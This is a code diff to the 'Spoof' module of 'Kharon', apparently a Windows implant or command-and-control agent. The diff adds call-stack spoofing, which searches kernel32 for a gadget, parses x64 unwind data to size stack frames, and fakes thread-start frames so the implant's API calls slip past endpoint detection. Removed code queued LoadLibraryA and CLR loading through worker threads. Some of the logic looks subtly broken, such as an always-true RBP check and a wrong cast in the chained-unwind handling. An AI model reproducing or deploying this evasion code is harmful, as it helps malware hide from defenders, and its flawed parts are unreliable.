@@ -1,144 +1,159 @@
 #include <Kharon.h>
 
-EXTERN_C VOID CLRCreateInstanceProxy( _In_ PVOID Context );
-EXTERN_C VOID LoadLibraryAProxy( _In_ PVOID Context );
+EXTERN_C UPTR SpoofCall( ... );
 
-auto DECLFN Spoof::WorkCall(
-    _In_ UPTR Context,
-    _In_ INT8 Identifier
-) -> LONG {
-    HANDLE Notify = nullptr;
-    LONG   Status = STATUS_UNSUCCESSFUL;
-    ULONG  WtRest = 0;
-
-    WORKERCALLBACKFUNC WorkerCallback = nullptr;
-
-    switch ( Identifier ) {
-        case WkrClrCreateInstance: {
-            WorkerCallback = (WORKERCALLBACKFUNC)CLRCreateInstanceProxy; break;
-        }
-        case WkrLoadLibraryA: {
-            // WorkerCallback = (WORKERCALLBACKFUNC)LoadLibraryAProxy; break;
-            WorkerCallback = (WORKERCALLBACKFUNC)static_cast<LOAD_CTX*>( (PVOID)Context )->LoadLibraryAPtr;
-            Context        = static_cast<LOAD_CTX*>( (PVOID)Context )->LibraryName; break;
-        }
-        default:
-            return STATUS_INVALID_PARAMETER;
-    }
-    
-    Status = Self->Ntdll.NtCreateEvent( &Notify, EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE );
-    if ( Status != STATUS_SUCCESS ) goto _KH_END;
-
-    Status = Self->Ntdll.RtlQueueWorkItem( (WORKERCALLBACKFUNC)WorkerCallback, (PVOID)Context, WT_EXECUTEDEFAULT );
-    if ( Status != STATUS_SUCCESS ) goto _KH_END;
-
-    Status = Self->Ntdll.RtlQueueWorkItem( (WORKERCALLBACKFUNC)Self->Krnl32.SetEvent, (PVOID)Notify, WT_EXECUTEDEFAULT );
-    if ( Status != STATUS_SUCCESS ) goto _KH_END;
-    
-     WtRest = Self->Krnl32.WaitForSingleObject( Notify, INFINITE );
-     if ( WtRest != WAIT_OBJECT_0 ) {
-        Status = STATUS_TIMEOUT;
-     }
-
-_KH_END:
-    if ( Notify ) Self->Ntdll.NtClose( Notify );
-
-    return Status;
-}
-
-EXTERN_C PVOID SpoofCall( UPTR Lib, UPTR Fnc, PVOID );
-
-template <typename... Args>
 auto DECLFN Spoof::Call(
-    _In_ UPTR Lib, 
     _In_ UPTR Fnc, 
-    Args... args
-) {
-    
-    do {
-        this->Setup.Gadget.Ptr = Self->Usf->FindGadget( this->Setup.Gadget.Lib, 0x23 );
+    _In_ UPTR Ssn, 
+    _In_ UPTR Arg1,
+    _In_ UPTR Arg2,
+    _In_ UPTR Arg3,
+    _In_ UPTR Arg4,
+    _In_ UPTR Arg5,
+    _In_ UPTR Arg6,
+    _In_ UPTR Arg7,
+    _In_ UPTR Arg8,
+    _In_ UPTR Arg9,
+    _In_ UPTR Arg10,
+    _In_ UPTR Arg11,
+    _In_ UPTR Arg12
+) -> UPTR {
+    KhDbg( "RtlUserThreadStart+0x21" );
+    KhDbg( "Pointer    : %p", this->Setup.First.Ptr )
+    KhDbg( "Stack  Size: %u", this->Setup.First.Size );
+    KhDbg( "======================================" )
 
+    KhDbg( "BaseThreadInitThunk+0x14" );
+    KhDbg( "Pointer    : %p", this->Setup.Second.Ptr )
+    KhDbg( "Stack  Size: %u", this->Setup.Second.Size );
+    KhDbg( "======================================" )
+
+    do {
+        this->Setup.Gadget.Ptr  = Self->Usf->FindGadget( Self->KrnlBase.Handle, 0x23 );
+        this->Setup.Gadget.Size = (UPTR)this->StackSizeWrapper( this->Setup.Gadget.Ptr );
     } while ( ! this->Setup.Gadget.Size );
 
-    return SpoofCall( Lib, Fnc, (PVOID)&Setup );
+    KhDbg( "Gadget" );
+    KhDbg( "Pointer    : %p", this->Setup.Gadget.Ptr )
+    KhDbg( "Stack  Size: %u", this->Setup.Gadget.Size );
+    KhDbg( "======================================" )
+
+    Setup.ArgCount = 8;
+
+    return SpoofCall( Arg1, Arg2, Arg3, Arg4, Fnc, (PVOID)&this->Setup, Arg5, Arg6, Arg7, Arg8 );
 }
 
-auto DECLFN Spoof::GetRtmEntry(
-    _In_ UPTR LibBase,
-    _In_ UPTR FncOffset
-) -> PIMAGE_RUNTIME_FUNCTION_ENTRY {
-    PRUNTIME_FUNCTION       FncTable = { 0 };
-    PIMAGE_EXPORT_DIRECTORY ExpDir   = { 0 };
-    PIMAGE_NT_HEADERS       Header   = { 0 };
-    PIMAGE_DATA_DIRECTORY   DataDir  = { 0 };
+auto DECLFN Spoof::StackSizeWrapper(
+    _In_ UPTR RetAddress
+) -> UPTR {
+    LONG Status  = STATUS_SUCCESS;
+    UPTR ImgBase = 0;
 
-    Header   = (PIMAGE_NT_HEADERS)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );
-    DataDir  = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
-    FncTable = (PRUNTIME_FUNCTION)( LibBase + DataDir->VirtualAddress );
-    DataDir  = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    ExpDir   = (PIMAGE_EXPORT_DIRECTORY)( LibBase + DataDir->VirtualAddress );
+    RUNTIME_FUNCTION*     RtmFunction = { nullptr };
+    UNWIND_HISTORY_TABLE* HistoryTbl  = { nullptr };
 
-    for ( INT i = 0; i < ExpDir->NumberOfFunctions; i++ ) {
-        if ( FncTable[i].BeginAddress == FncOffset ) return (PIMAGE_RUNTIME_FUNCTION_ENTRY)( FncTable + i );
+    if ( ! RetAddress ) {
+        KhDbg("Invalid RetAddress");
+        return (UPTR)nullptr;
     }
 
-    return nullptr;
+    KhDbg("Looking up function entry for RetAddress 0x%p", RetAddress);
+    RtmFunction = Self->Ntdll.RtlLookupFunctionEntry( 
+        (UPTR)RetAddress, &ImgBase, HistoryTbl 
+    );
+    if ( ! RtmFunction ) {
+        KhDbg("No function entry found for RetAddress 0x%p", RetAddress);
+        return (UPTR)nullptr;
+    }
+
+    KhDbg("Found function entry at 0x%p, calling StackSize", RtmFunction);
+    KhDbg( "======================================" )
+    return StackSize( (UPTR)RtmFunction, ImgBase );
 }
 
-// auto DECLFN Spoof::StackSizeWrapper(
-//     _In_ PVOID RetAddress
-// )
-
 auto DECLFN Spoof::StackSize(
-    _In_ UPTR  LibBase,
-    _In_ PVOID UnwInfo
-) -> ULONG {
-    UNWIND_INFO*      UwInfo  = reinterpret_cast<PUNWIND_INFO>( UnwInfo );
-    UNWIND_CODE*      UwCode  = UwInfo->UnwindCode;
-    RUNTIME_FUNCTION* RtmFnc  = { 0 };
-    REG_CTX           Context = { 0 };
+    _In_ UPTR RtmFunction,
+    _In_ UPTR ImgBase
+) -> UPTR {
+    STACK_FRAME  Stack   = { 0 };
+    UNWIND_INFO* UwInfo  = (UNWIND_INFO*)( reinterpret_cast<RUNTIME_FUNCTION*>( RtmFunction )->UnwindData + ImgBase );
+    UNWIND_CODE* UwCode  = UwInfo->UnwindCode;
+    REG_CTX      Context = { 0 };
 
-    ULONG FrameSize = 0;
-    ULONG Total     = 0;
-    ULONG Index     = 0;
-    ULONG CodeCount = UwInfo->CountOfCodes;
+    ULONG FrameOffset = 0;
+    ULONG Total       = 0;
+    ULONG Index       = 0;
+    UBYTE UnwOp       = 0;
+    UBYTE OpInfo      = 0;
+    ULONG CodeCount   = UwInfo->CountOfCodes;
+
+    KhDbg("Processing unwind info at 0x%p with %d codes", UwInfo, CodeCount);
 
     while ( Index < CodeCount ) {
-        switch ( UwCode->UnwindOp ) {
+        UnwOp  = UwInfo->UnwindCode[Index].UnwindOp;
+        OpInfo = UwInfo->UnwindCode[Index].OpInfo;
+
+        switch ( UnwOp ) {
             case UWOP_PUSH_NONVOL: {
-                if ( UwCode->OpInfo == SpfRSP ) return 0;
-                Total += 8; break;
+                Stack.TotalSize += 8;
+                if ( OpInf::Rbp ) {
+                    Stack.PushRbp      = TRUE;
+                    Stack.CountOfCodes = CodeCount;
+                    Stack.PushRbpIdx   = Index + 1;
+                    KhDbg("UWOP_PUSH_NONVOL for RBP at index %d", Index);
+                }
+                break;
             }
             case UWOP_ALLOC_LARGE: {
-                UwCode = (PUNWIND_CODE)( (PUINT16)UwCode + 1 );
                 Index++;
-                FrameSize = UwCode->FrameOffset;
+                FrameOffset = UwCode[Index].FrameOffset;
 
-                if ( UwCode->OpInfo == 0 ) {
-                    FrameSize *= 8;
-                } else {
-                    UwCode = (PUNWIND_CODE)( (PUINT16)UwCode + 1 );
+                if ( OpInfo == 0 ) {
+                    FrameOffset *= 8; 
+                    KhDbg("UWOP_ALLOC_LARGE (small) adding %X %d bytes", FrameOffset, FrameOffset);
+                } else if ( OpInfo == 1 ) {
                     Index++;
-                    FrameSize += UwCode->FrameOffset << 16;
+                    FrameOffset += UwCode[Index].FrameOffset << 16;
+                    KhDbg("UWOP_ALLOC_LARGE (large) adding [%X] %d bytes", FrameOffset, FrameOffset);
                 }
 
-                Total += FrameSize; break;
+                Stack.TotalSize += FrameOffset; break;
             }
             case UWOP_ALLOC_SMALL: {
-                Total += 8 * ( UwCode->OpInfo + 1 ); break;
+                ULONG size = ( ( OpInfo * 8 ) + 8 );
+                KhDbg("UWOP_ALLOC_SMALL adding %X %d bytes", size, size);
+                Stack.TotalSize += size; break;
             }
             case UWOP_SET_FPREG: {
+                Stack.SetsFramePtr = TRUE; 
+                KhDbg("UWOP_SET_FPREG detected");
                 break;
             }
             case UWOP_SAVE_NONVOL: {
-                if ( UwCode->OpInfo == SpfRSP ) return 0;
-                else {
-                    DEF32( &Context + UwCode->OpInfo )  = Total + ( (UNWIND_CODE*)( U_32( UwCode + 1 ) ) )->FrameOffset * 8;
-
-                    // UwCode.
-                }
-            } 
+                Index += 1; 
+                KhDbg("UWOP_SAVE_NONVOL at index %d", Index);
+                break;
+            }
+            default:
+                KhDbg("Unknown unwind op %d at index %d", UnwOp, Index);
+                break; 
         }
-        
+
+        Index += 1;
     }
+
+    if ( UwInfo->Flags & UNW_FLAG_CHAININFO ) {
+        Index = UwInfo->CountOfCodes;
+        if ( Index & 1 ) Index += 1;
+
+        KhDbg("Chained unwind info detected, continuing at index %d", Index);
+        RtmFunction = (UPTR)( reinterpret_cast<RUNTIME_FUNCTION*>( &UwInfo->UnwindCode[Index] ) );
+        return this->StackSize( RtmFunction, ImgBase );
+    }
+    
+    Stack.TotalSize += 8;
+    KhDbg("Final stack size calculated as %d bytes", Stack.TotalSize);
+    KhDbg( "======================================" )
+
+    return (UPTR)Stack.TotalSize;
 }
